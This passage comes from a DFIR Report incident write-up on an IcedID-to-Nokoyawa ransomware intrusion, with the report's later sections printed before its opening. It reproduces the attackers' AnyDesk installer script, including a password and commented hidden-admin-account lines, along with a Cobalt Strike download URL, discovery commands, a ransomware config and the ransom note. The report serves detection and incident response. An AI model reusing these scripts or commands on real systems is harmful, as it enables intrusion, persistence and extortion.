--od=\"DeskBlouse\\license.dat\"</Arguments> </Exec> </Actions> </Task> The scheduled task was configured to execute at logon under the user that initially executed the IcedID payload. Later in the intrusion, AnyDesk was installed with a command line option that established persistence, running when Windows starts by creating a Service: C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent During the deployment of AnyDesk, a service creation event was generated under the System channel: Alerting on every service creation is usually far too noisy for any meaningful review by security operations personnel, but it can be very helpful to alert on specific patterns of remote monitoring and management (RMM) installation artifacts. There are many approaches for detecting RMM tools through resilient patterns of file paths or digital signatures. These legitimate tools may not trigger alerts in endpoint detection products by default, so it is important for security teams to create custom detections. As seen in various previous cases here at The DFIR Report, and also on other platforms, RMM tools provide a very easy way to get access to systems with interactive capabilities. Privilege Escalation The user account that opened the initial OneNote lure file was in the domain administrators security group. Usually, threat actors have to work to escalate to a domain admin from an unprivileged user account, but in this case, it was a given. This is an example of why it is a best practice for domain administrators to use separate accounts and a privileged workstation to perform administrative functions, while using a non-privileged user account to check email, browse the web, and open files from unknown sources when necessary. Defense Evasion Masquerading One of the simpler ways that IcedID attempted to evade detection was by naming the malware DLL file as COIm.jpg. Renaming a DLL file extension to a commonly ignored graphics file type, such as jpg, gif, or png, is a simple example of Masquerading, MITRE Technique T1036.008 , and represents an excellent opportunity for a custom detection . The threat actor was observed using common Windows process names for other tooling used during the intrusion, including: csrss.exe for a Cobalt Strike beacon downloaded from 91.215.85[.]183/download/csrss.exe svchost.exe for the ransomware payload deployed to systems. Process Injection Upon execution of a Cobalt Strike beacon, process injection into a svchost.exe process was observed. In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread. svchost.exe was subsequently observed executing multiple different commands related to discovery and enumeration. Since the discovery commands involved executing scripts via cmd.exe , the anomalous parent child relationship between svchost.exe and cmd.exe was observed on the system from a memory dump. Indicator Removal FileZilla, installed by the threat actors for exfiltration activity, was observed being manually uninstalled by the threat actors during the final ransomware deployment period. Credential Access The threat actors extracted credentials from LSASS during the intrusion. The process started with a Cobalt Strike beacon process starting a new rundll32.exe child process, with no command line arguments, as SYSTEM. It is unusual for rundll32 to be executed without any command line, but it is a common pattern for Cobalt Strike beacon injection target processes. This makes a useful detection pattern. The rundll32 process also created a named pipe (Sysmon Event ID 17) with a pipe name that started with \u201c\\postex_\u201d which is another well-known Cobalt Strike beacon artifact that can be detected. The newly spawned rundll32 process accessed the lsass.exe process, and then created a remote thread in lsass.exe. These events were recorded by Sysmon event IDs 8 and 10. Event ID 10 had the following relevant fields, which may be useful for threat hunting or incident response: Process accessed: SourceImage: C:\\Windows\\system32\\rundll32.exe TargetImage: C:\\Windows\\system32\\lsass.exe GrantedAccess: 0x1FFFFF CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d1e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcbe|UNKNOWN(0000017C0BD11D3D) TargetUser: NT AUTHORITY\\SYSTEM Event ID 8 had the following relevant fields: CreateRemoteThread detected: SourceImage: C:\\Windows\\System32\\rundll32.exe TargetImage: C:\\Windows\\System32\\lsass.exe StartModule: - StartFunction: - TargetUser: NT AUTHORITY\\SYSTEM After accessing and injecting into LSASS, the threat actors began using another domain administrator account indicating successful credential access. During file share browsing activity by the threat actors, we observed them finding and opening a document related to passwords for the environment. Discovery IcedID Discovery IcedID was observed executing multiple discovery commands originating from rundll32.exe on the beachhead. WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List ipconfig /all systeminfo net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all net group \"Domain Admins\" /domain These host profiling commands in this order are typically seen from IcedID bots, and reverse engineering the IcedID binary shows that they are hard-coded (in encrypted strings) to be run when the bot receives a specific command from its command and control server. A published IcedID analysis report from Binary Defense describes the same commands observed , and a report from Walmart Global Tech details the algorithm to decrypt the command strings. In different IcedID samples, the commands may appear in a different order, but all versions contain nearly the same list of profiling commands. While alerting on any one of these commands by itself might result in too many false-positive alerts for security operations, a useful technique is to set up alerts when more than three or four of these commands are seen in a short time period on the same host. If the parent process is rundll32, regsvr32, or another high-risk process, the severity of the alert may be elevated. Active Directory Enumeration An AD.bat batch script and AdFind.exe were dropped onto the beachhead host from a process injected svchost.exe process. The AD.bat script was subsequently executed, which initiated discovery of Active Directory via ADFind. adfind.exe -gcb -sc trustdmp adfind.exe -f \"(objectcategory=group)\" adfind.exe -subnets -f (objectCategory=subnet) adfind.exe -f (objectcategory=organizationalUnit) adfind.exe -f objectcategory=computer -csv name operatingSystem adfind.exe -f objectcategory=computer adfind.exe -f (objectcategory=person) C:\\Windows\\system32\\cmd.exe /c dir /s /b C:\\Windows\\system32\\*htable.xsl Nslookup Discovery An injected process svchost.exe was observed dropping a ns.bat Batch script. Execution of ns.bat initiated the execution of nslookup commands that attempted to resolve multiple desktop and server hostnames. Later, a second nsser.bat script was observed executing multiple nslookup commands. Port Scanning SoftPerfect Network Scanner was used by the threat actor on multiple different systems under different directories. NetScan was seen connecting to multiple ports, on multiple different IP addresses\u2013an activity indicative of port scanning. The following summarizes a list of ports that were scanned using NetScan. Port Purpose 53 DNS 80 HTTP 88 Kerberos 111 NFS, NIS, or any rpc-based service 135 Remote Procedure Call 137 NetBIOS 161 SNMP 389 LDAP 443 HTTPS 445 SMB 464 Used by the Kerberos authentication system 2049 NFS 3389 RDP 5353 Multicast DNS (mDNS) and DNS-SD Hands on Discovery During RDP sessions the threat actors were also observed opening Task Manager multiple times via the Start Menu, as indicated by the /7 flag. Other commands were observed being executed manually by the threat actors, either from Cobalt Strike beacons or in Windows cmd shells opened via the interactive AnyDesk or RDP sessions. Commands included: C:\\Windows\\system32\\cmd.exe /C net group \"domain Admins\" /domain route print whoami Lateral Movement RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment. After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system. The Cobalt Strike payload was downloaded from 91.215.85[.]183/download/csrss.exe via Internet Explorer. The payload was then launched multiple times from the Downloads folder and also copied and executed from the Windows temporary folder. In addition, the INSTALL.ps1 script was dropped and executed by the Cobalt Strike beacon. Collection While the threat actors had spent significant time in the environment, there appeared to be some interest in certain documents. A concrete example is, directly after the threat actors accesses the file server with AnyDesk, they use notepad++ to open a file related to the insurance policy of this victim. On the beachhead, workstation files were opened with their \u2018preferred\u2019 option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf. While it is not always easy to get a full list of files a threat actor had specifically accessed, this time it was logged well in process activity. On other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data. Command and Control The threat actors used three different ways to access the hosts within this network: IcedID Cobalt Strike AnyDesk Below is an overview of each of the stages found during the intrusion. IcedID IcedID uses multiple staged domains to deliver parts of its functionality. The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131. The contents of this network connection matched a malware rule in the free Emerging Threats Open ruleset ET MALWARE Win32/IcedID Request Cookie. The IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic. The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days. The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days. Below table shows an overview and function of each domain: IP Port Domain Usage ISP Location 193.149.129.131 80 aerilaponawki[.]com First callout and primary C2 IcedID BLNWX NL 5.255.102.167 443 klindriverfor[.]com Additional C2 IcedID The Infrastructure Group NL 45.61.139.206 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB 5.255.105.55 443 halicopnow[.]com Additonal C2 IcedID The Infrastructure Group NL For each of the domains, an overview of the relevant rules that can be used (in combination) to look for IcedID behavior: aerilaponawki[.]com: ET MALWARE Win32/IcedID Request Cookie klindriverfor[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) alishaskainz[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) halicopnow[.]com: ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0) When looking for additional strange network connections, we can find these two gathered from a memory dump of the compromised systems. The connection from rundll32.exe is especially interesting and is related to our IcedID infection. It appears to be a different IP for one of the previously found command and control domains. IP Port Domain Usage ISP Location 162.33.178.40 443 alishaskainz[.]com Additional C2 IcedID BL Networks GB GB Cobalt Strike The Cobalt Strike beacons which were used during the intrusion were named: agaloz.dll Funa2.exe / csrss.exe They contain a configuration to contact the below command and control server: IP Domain Usage ISP Location 91.215.85.183 msc-mvc-updates[.]com Cobalt Strike C2 Prospero Ooo RU Suricata reported hits for \u2018 Malleable\u2019 profiles used by the Cobalt Strike beacon. These profiles are preconfigurable and are mostly used to \u2018mimic\u2019 known traffic of different applications, such as a mail client, chat client, or a JavaScript library. The rule that hits, can be seen in the first screenshot below. The second screenshot shows the actual configured portion of the profile, which appears very similar to this \u201cgmail\u201d profile . Communication goes via the URI: /_/scs/mail-static/_js/ The DFIR Report Threat Intel Team picked up this Cobalt Strike server on January 9th, 2023, weeks before the intrusion. On that day, the beacon profile resembled a freely available malleable C2 profile that mimics jquery . The command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to the Triage malware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion. With that said, it appears Microsoft took over this domain on April 6, 2023 when DNS was switched from Cloudflare to MICROSOFTINTERNETSAFETY.NET and the domain started resolving to 20.69.178.82 (Microsoft). We can see the registration information was updated (date showing last updated) as well: We were also able to locate the complaint by Microsoft, Fortra and Health-ISAC to acquire this domain: Here\u2019s an outtake of the domain and registration information from the complaint . According to The DFIR Report\u2019s Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023. After initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable called Funa2.exe . It appears that the .dll likely didn\u2019t work as expected, as five minutes later an .exe with the same name gets downloaded. DLL download attempt: Change to EXE download: Shortly after, we find the first connection to the server using the malleable profile paths: AnyDesk During later stages of the intrusion, the threat actors deployed AnyDesk using a PowerShell script copied under C:\\ProgramData\\INSTALL.ps1 . In addition, the copied PowerShell script was executed on multiple systems to facilitate the deployment of AnyDesk using the following commands: mkdir \"C:\\ProgramData\\Any\" # Download AnyDesk $clnt = new-object System.Net.WebClient $url = \"http://download.anydesk.com/AnyDesk.exe\" $file = \"C:\\ProgramData\\AnyDesk.exe\" $clnt.DownloadFile($url,$file) cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent cmd.exe /c echo btc1000qwe123 | C:\\ProgramData\\Any\\AnyDesk.exe --set-password #net user AD \"2020\" /add #net localgroup Administrators InnLine /ADD #reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v InnLine /t REG_DWORD /d 0 /f This install script appears to be similar to the previously leaked powershell script used by Conti : AnyDesk can be used, either as an installed service (as we can see above) or it can use a portable version. The differences and limitations are written on the official site of AnyDesk . As we are dealing with the \u2018installed\u2019 version, it will leave certain artifacts related to the installed version on the system. Multiple people have written about AnyDesk artifacts, such as Inversecos or TylerBrozek , which help a lot during the forensic process related to Anydesk artifacts. For the ad_svc.trace we can find entries like this: info REDACTED gsvc 6600 11452 26 anynet.any_socket - Client-ID: 485343132 (FPR: 9805919074ee). info REDACTED gsvc 6600 11452 46 anynet.any_socket - Logged in from 152.89.196.49:61384 on relay a541c14e info REDACTED gsvc 10136 2256 2515 anynet.any_socket - Client-ID: 547283332 (FPR: 17e2ee445059). info REDACTED gsvc 10136 2256 2515 anynet.any_socket - :54241 on relay ffe9a90c. IP Usage ISP Country AnyDesk Client ID 152.89.196.49 AnyDesk Interactive Starcrecium Limited RU 485343132 185.29.9.162 AnyDesk Interactive DataClub SE 547283332 Exfiltration After the threat actors gained access to a file server in the domain, they quickly prepared this machine for exfiltration. This was performed by downloading the Filezilla FTP client installer using internet explorer on the server. The threat actors were so kind to use the sponsored version, to bring some additional PUP\u2019s as well: Shortly after, the threat actors connected from the file server, using FileZilla, to 45.155.204.5 via SSH and key exchange can be observed in the network traffic: IP Usage ISP Country SSH Info: 45.155.204.5 SSH for FileZilla 3NT Solutions LLP RU Hash : c561c2cdad206b6ed8469079e037e3f9 SSH Version : ssh-2.0-filezilla_3.63.2.1 FileZilla can leave behind some nice forensics artifacts (if the installation is not removed). Writing in this blog by Artifast , a nice overview can be seen. In this case, we were able to recover part of the .xml files resulting in the below correlation between the network data and the host data. While each separate source was already a good finding on its own, this combination leaves less room for guessing. Impact Thirty-four days after the first infection, and about 28 hours after the beginning of hands-on activity, the threat actors proceeded to their final actions, deploying Nokayawa ransomware. The variant of Nokoyawa was similar to those we\u2019ve already reported on . As in most ransomware related cases, before actual deployment, the threat actors looked around to gather information related to backup functionality and systems. In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and \u2018debugging\u2019 the ransomware and finally cleaning up. The threat actors started by using mmc.exe to look into the Local Group Policy by using gpedit.msc. Around 20 minutes later, the threat actors started executing the ransomware script on the file server. The ransomware files, in this case svchost.exe and an \u2018automation\u2019 file [REDACTED].1.bat , were delivered via the AnyDesk sessions as parent process. The batch script, [REDACTED].1.bat , launched the executable svchost.exe with a --config parameter, containing a base64 encoded string: { EXTENSION: \"NOKONOKO\", NOTE_NAME: \"NOKONOKO-readme.txt\", NOTE_CONTENT: \"<BASE64 ENCODED NOTEBLOB>\", ECC_PUBLIC: \"AHpyfaG1ftdE4NNQ0laC2825GOpTwUw5Y9+WEMkAAAC0Yd7VSOy7D5CxWhHH4pzSYdCXjpPXqEZ2X2r6kgEAAA==\", SKIP_DIRS: [ \"windows\", \"program files\", \"program files (x86)\", \"appdata\", \"programdata\", \"system volume information\" ], SKIP_EXTS: [ \".exe\", \".dll\", \".ini\", \".lnk\", \".url\" ], ENCRYPT_NETWORK: true, LOAD_HIDDEN_DRIVES: true, DELETE_SHADOW: true } After the execution on the file server, the threat actors moved to the backup server, where they repeated their interest in the Group Policy. On the backup server, they also opened the server configuration. There appeared to be a problem, as there was some \u2018file locking\u2019 in place, likely preventing access. The threat actors tried to circumvent these \u2018locks\u2019 by utilizing a tool called IOBit . This tool is capable of removing file locks. After this, the ransomware was deployed in the same manner as on the file server. However, there appeared to be a problem with the deployment. The threat actors started ProcessHacker and utilized notepad++ to likely fix something related to the ransomware execution. This is based on the fact that, the threat actors executed the ransomware binary 11 times on the backup server and afterwards returned and executed the ransomware a second time on the file server. After encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs. In addition, notepad was used to view the deployed ransom note after the final execution on the file server. The NOTE_CONTENT (from above base64 configuration) appears to be base64 encoded again and decoded gives the following ransom note: Nokoyawa. If you see this, your files have been successfully encrypted and stolen. Don't try to search free decryption method. It's impossible. We are using symmetrical and asymmetric encryption. ATTENTION: - Don't rename encrypted files. - Don't change encrypted files. - Don't use third party software. You are risking irreversibly damaging the file by doing this. If you manage to keep things quiet on your end, this will never be known to the public. To reach an agreement you have 48 hours to visit our Onion Website. How to open Onion links: - Download TOR Browser from official website. - Open and enter this link: http://nokopay<REDACTED> - On the page you will see a chat with the Support. - Send your first message. Don't waste your time. Otherwise all your valuable and sensitive data will be leaked. Our websites are full of companies that doubted the fact of the data breach or it's extent. - http://nokoleakb76znymx443veg4n6fytx6spck6pc7nkr4dvfuygpub6jsid.onion/ - http://hl66646wtlp2naoqnhattngigjp5palgqmbwixepcjyq5i534acgqyad.onion/ - http://snatchteam.top The threat actors only deployed the ransomware on the two servers and did not perform a domain wide deployment. After the ransom of these two systems, the threat actor\u2019s activity ceased. Please consider leaving feedback on this report here . Timeline Diamond Model Indicators Atomic IcedID mrassociattes[.]com (174.138.188.6) aerilaponawki[.]com (193.149.129.131) klindriverfor[.]com (5.255.102.167) alishaskainz[.]com (dr) Cobalt Strike msc-mvc-updates[.]com (91.215.85.183) FileZilla File Exfiltration 45.155.204.5 Computed Contract_02_21_Copy#909.one 5f4d630ef00656726401b205ae4dc88f aa8f2d6d98aa535e05685076ca02f781c2aa6464 9c337d27dab65fc3f4b88666338e13416f218ab75c4b5e37cc396241c225efe8 COIm.jpg d1da347e78bf043e2dc61638e946c3da d87a3c22771b1106a1a52d96df7b2944d93fa184 1ab812f7d829444dc703eeb02ea0a955ec839d5e2a9b619d44ac09a91135cad1 GET_ID.bat a59a7916156c52f732b4c2e321facfe1 8c949a7769d16c285347f650ef2eedac01dc1805 eae2bce6341ff7059b9382bfa0e0daa337ea9948dd729c0c1e1ee9c11c1c0068 INSTALL.ps1 b1f5e4774aa79f643350218df61e33f6 f1e7994c6568f0182a60f64557c7793df5e550ed b378c2aa759625de2ad1be2c4045381d7474b82df7eb47842dc194bb9a134f76 agaloz.dll 76a1f94ed6499b99d2cc500998846875 ca14d61bcf038cda45199f54c7c452ad262a7c88 d6127d614309acbf2a630fe3fb0fda8e4079dcf2045f91aa400d179751d425f7 csrss.exe/Funa2.exe f927cd4f40c7a6dad769a8f9af771a8c 0fdfef7c9cc4305df81b006e898e1592aa822437 06bbb36baf63bc5cb14d7f097745955a4854a62fa3acef4d80c61b4fa002c542 svchost.exe 8800e6f1501f69a0a04ce709e9fa251c 72a1c9ea93d18309769d8be5cdb3daedf1cddcf5 3c9f4145e310f616bd5e36ca177a3f370edc13cf2d54bb87fe99972ecf3f09b4 Detections Network ET MALWARE Observed DNS Query to IcedID Domain (qoipaboni .com) ET MALWARE Win32/IcedID Request Cookie ET INFO Windows Powershell User-Agent Usage ETPRO INFO HTTP Request with Lowercase accept Header Observed ET MALWARE Cobalt Strike Malleable C2 (Unknown Profile) ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection ET POLICY SMB2 NT Create AndX Request For an Executable File ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET POLICY HTTP traffic on port 443 (POST) ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET SCAN Potential SSH Scan OUTBOUND ET HUNTING Possible Powershell .ps1 Script Use Over SMB ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File ET HUNTING Suspicious csrss.exe in URI ET INFO Executable Download from dotted-quad Host ET INFO Dotted Quad Host DLL Request Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Public Rules Repo : b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network 50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery 8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check DFIR Private Rules: baa9adf9-a01c-4c43-ac57-347b630bf69e : Default Cobalt Strike Named Pipes a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line 624f1f33-ee38-4bbe-9f4a-088014e0c26b : IcedID Malware Execution Patterns 37948baa-5310-424c-bb18-b29c56be160f : Suspicious Execution of DLL with Unusual File Extensions Sigma Repo : 530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation 114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI 065b00ca-5d5c-4557-ac95-64a6d0b64d86 : Remote Access Tool - Anydesk Execution From Suspicious Folder 9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution 903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution 5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE 0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo 968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity e568650b-5dcd-4658-8f34-ded0b1e13992 : Potential Product Class Reconnaissance Via Wmic.EXE fcc6d700-68d9-4241-9a1a-06874d621b06 : Suspicious File Created Via OneNote Application d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 : CobaltStrike Named Pipe 811e0002-b13b-4a15-9d00-a613fce66e42 : PUA - Process Hacker Execution d5866ddf-ce8f-4aea-b28e-d96485a20d3d : Files With System Process Name In Unsuspected Locations 96036718-71cc-4027-a538-d1587e0006a7 : Windows Processes Suspicious Parent Directory c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent JoeSecurity Repo : 200068 : Execute DLL with spoofed extension Yara https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19772/19772.yar MITRE Credentials In Files - T1552.001 Data Encrypted for Impact - T1486 Data from Network Shared Drive - T1039 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Indicator Removal - T1070 Ingress Tool Transfer - T1105 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerade File Type - T1036.008 Masquerading - T1036 Network Service Discovery - T1046 Phishing - T1566 PowerShell - T1059.001 Process Discovery - T1057 Process Injection - T1055 Regsvr32 - T1218.010 Remote Access Software - T1219 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Rundll32 - T1218.011 Scheduled Task - T1053.005 Security Software Discovery - T1518.001 System Information Discovery - T1082 System Owner/User Discovery - T1033 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Service - T1543.003 Internal case #19772 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Threat Brief: WordPress Plugin Exploit Leads to Godzilla Web Shell, Discovery & New CVE From IcedID to Dagon Locker Ransomware in 29 Days Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind Exfiltrate Data icedid nokoyawa ransomware From OneNote to RansomNote: An Ice Cold Intrusion April 1, 2024 Key Takeaways In late February 2023, threat actors rode a wave of initial access using Microsoft OneNote files. In this case, we observed a threat actor deliver IcedID using this method. After loading IcedID and establishing persistence, there were no further actions, other than beaconing for over 30 days. The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server. The threat actor used FileZilla to exfiltrate data from the network before deploying Nokoyawa ransomware . An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon . Please consider leaving feedback on this report here . Services We provide a range of services, one of which is our Threat Feed, specializing in monitoring Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, Viper, Mythic, Havoc, Meterpreter, and more. For example, the Cobalt Strike server in this case was detected weeks before this intrusion started. Another service we provide is Private Threat Briefs, which encompasses over 25 private reports annually. These reports follow a format similar to our public reports but are more concise in nature. In contrast to our public reports, these briefs are typically released shortly after an intrusion, sometimes even while the intrusion is still ongoing. Our comprehensive \u201cAll Intel\u201d service includes the Threat Feed, Private Threat Briefs, exploit events, long-term infrastructure tracking, clustering, Cobalt Strike configurations, C2 domains, and a curated collection of intelligence, which includes non-public case data. Our Private Sigma Ruleset is exclusively curated using insights derived from Private Threat Briefs and internal cases, focusing on Sigma rules. As of January 2024, it encompasses approximately 100 Sigma rules, created from the knowledge of 40+ distinct cases. Each rule is mapped to ATT&CK and accompanied by a test example. Contact us for a demo or free trial today! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary This intrusion started in late February of 2023 and lasted through late March of 2023. The threat actor initially gained access through a phishing campaign, in which they distributed emails containing malicious OneNote attachments. During this period, OneNote files had surged in popularity among initial access brokers. This rise was primarily due to their capability to circumvent email attachment blocking rules and evade detection by existing security mechanisms. Upon opening the malicious OneNote file and engaging with it, the file triggered the execution of a cmd file. This, in turn, launched PowerShell to facilitate the download of an IcedID DLL from a remote server. To evade detection, this DLL was disguised using various image file extensions. Following the execution of the downloaded DLL, a scheduled task was established to maintain persistence within the system. Notably, unlike prior IcedID infections, no discovery actions were observed at this time. For the next 21 days, activity was limited to command and control beaconing with no other actions detected. On day 22, the standard IcedID discovery, using Microsoft tools like: net, nltest, chcp, and systeminfo, was observed. Beyond this, no further activity was noted. On day 33 of the intrusion, the IcedID malware launched several Cobalt Strike beacons. These beacons, once active on the beachhead host, injected into numerous processes and initiated an Active Directory discovery operation. This operation used a batch script to execute a series of AdFind commands. Next, a PowerShell script was deployed to install AnyDesk. Following the installation, another batch script ran to relay the newly generated AnyDesk ID back to the threat actor. The threat actor then connected to the host using AnyDesk and began browsing files. The account they were logged in as had elevated privileges, since the original user, who inadvertently activated the malware, was a member of the domain administrators group. Leveraging this access, they accessed LSASS on the host and proceeded with additional reconnaissance activities. These actions encompassed both command line queries, such as net, whoami, and route, as well as GUI based tools through the AnyDesk connection, including the use of Task Manager and the deployment of SoftPerfect Network Scanner (aka NetScan). After getting a list of hosts, the threat actor created a batch file to run nslookup for all the identified hosts. While that was running, the threat actor browsed file shares, looking at various documents including password related documents. The threat actor then created a second batch script to run nslookup, this time targeting Windows servers specifically. Shortly after running this, the threat actor initiated their first lateral movement action, using RDP to connect to a backup server from their beachhead host. On the backup server, they used Internet Explorer to download a Cobalt Strike beacon and then they executed it. Utilizing this beacon, they proceeded to deploy and execute an AnyDesk installer package, identical to the one observed on the initial compromised host. Next, they pivoted to a file server and performed the same actions. On the file server, they continued to review documents, including insurance related files. The threat actor then opened Internet Explorer on the file server and proceeded to download FileZilla. Utilizing the FileZilla client, they established a SFTP connection to a remote server, initiating the data exfiltration process. This marked the beginning of a prolonged data exfiltration operation that spanned several hours. Apart from the ongoing data transfers, activity significantly decreased until it resumed the following day. Approximately 18 hours after the initiation of the data exfiltration process, the threat actor deemed the activity complete and progressed to the next phase of their attack. They conducted another network scan utilizing NetScan. Roughly two and a half hours post-scan, they initiated the preparation for a ransomware delivery. Leveraging their AnyDesk connection on the file server, they reviewed both the Task Manager and the Local Group Policy Manager, before dropping a ransomware file on the host. Following this, they executed a batch script designed to launch the ransomware. Following the execution of ransomware on the file server, the threat actor re-established their connection to the backup server, conducting similar checks via Task Manager and Local Group Policy Manager before dropping the ransomware file. Next, they introduced and executed IOBit\u2019s Unlocker utility, a move likely aimed at circumventing file locks imposed by the backup software. After using this tool, they followed the same batch script execution on this server as previously observed. After execution, they dropped and ran ProcessHacker and then proceeded to open the batch file in notepad++ before re-running the script and ransomware. Approximately two hours after the initiation of the ransomware on the file server, the threat actor revisited the system through their AnyDesk connection. In this return visit, they uninstalled FileZilla, signaling a move to cover their tracks. Next, they re-executed the ransomware on the host, and then opened the ransom note on the server\u2019s desktop, verifying their objective was complete. Following this action, no further activities were detected from the threat actor regarding the ransomware deployment, indicating a strategic decision to limit the attack\u2019s scope to these two critical servers rather than extending it across the entire network. From initial access to ransomware execution, we observed a Time to Ransomware (TTR) of 812 hours, just over 34 calendar days. One interesting thing to note about the command and control domain for Cobalt Strike is it was seized by Microsoft, Fortra and Health-ISAC a few weeks after this intrusion. On April 6, 2023, the command and control domain changed DNS to Microsoft with a domain registration name of Digital Crimes Unit. Please consider leaving feedback on this report here . Analysts Analysis and reporting completed by @iiamaleks , @IrishD34TH , and @Miixxedup Initial Access A widespread malicious email campaign that broadly targeted many companies in unrelated industries blasted generic lures with an attached OneNote file claiming to contain an unspecified \u201csecure message.\u201d The campaign was documented in open-source threat intelligence by pr0xylife on their GitHub repository . The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload. According to Proofpoint Threat Research, the campaign was not very large in message volume compared to other campaigns, with fewer than one thousand messages observed over two days, broadly targeting companies across Manufacturing, Technology, Energy, Retail, Insurance, and several other sectors. The threat actor behind the campaign used techniques similar to two tracked threat actors but did not provide enough unique attributes to strongly attribute the campaign to either one of them. The OneNote file used to gain initial access in this case was not very sophisticated. A Windows batch file named \u201cO p e n.cmd\u201d was hidden behind a large button marked \u201cOpen\u201d in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button. Execution The initial execution through the OneNote lure required the person who received the email attachment to open the OneNote file. After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie. The earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote: The metadata of the O p e n.cmd batch file can be found on VirusTotal , and the contents are shown below. It is a very simple batch script that uses basic obfuscation, but yet presents some easy detection opportunities in its behavior: After 